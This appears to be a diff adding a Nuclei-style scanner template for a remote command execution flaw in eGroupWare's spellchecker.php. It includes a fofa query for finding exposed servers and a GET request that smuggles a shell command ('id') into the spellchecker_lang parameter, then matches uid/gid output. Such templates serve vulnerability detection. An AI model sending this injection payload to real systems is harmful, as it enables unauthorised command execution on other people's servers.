@@ -1,0 +1,25 @@
+id: egroupware-rce
+
+info:
+  name: eGroupWare spellchecker.php 远程命令执行
+  author: SleepingBag945
+  severity: high
+  description: |-
+    eGroupWare是一个多用户，在以PHP为基础的API上的定制集为基础开发的，以WEB为基础的工作件套装，其中 spellchecker.php 文件中存在命令执行漏洞
+    fofa: app="EGROUPWARE-产品"
+  tags: rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Cid%7C%7C"
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)"
